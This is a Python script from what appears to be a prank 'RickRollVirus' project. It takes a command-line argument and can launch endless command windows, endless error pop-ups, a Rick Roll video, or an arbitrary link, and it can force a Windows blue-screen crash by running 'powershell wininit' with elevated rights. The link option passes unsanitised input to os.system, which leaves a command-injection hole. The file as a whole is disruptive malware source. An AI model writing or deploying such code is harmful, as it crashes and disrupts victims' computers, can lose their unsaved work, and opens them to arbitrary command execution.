import os, sys
from Run_as_admin import RunasAdmin

def main():
    runas = RunasAdmin()
    process = str(sys.argv[1])

    if (process == '-infinite-cmd'):
        os.system('cd C:/Users/ponce/OneDrive/Documentos/Workspace/Python/RickRollVirus/Computer-side && start Infinitecmd.bat')
    elif (process == '-infinite-errors'):
        os.system('cd C:/Users/ponce/OneDrive/Documentos/Workspace/Python/RickRollVirus/Computer-side && start Infiniteerror.vbs && exit')
    elif (process == '-rickroll'):
        os.system('start https://www.youtube.com/watch?v=dQw4w9WgXcQ && exit')
    elif (process == '-link'):
        link = str(sys.argv[2])
        os.system('start ' + link + ' && exit')
    elif (process == '-blue-screen'):
        runas.runasadmin('powershell wininit')
    else:
        print('ERROR: The typed process does not exist')

if __name__ == "__main__":
    main()    
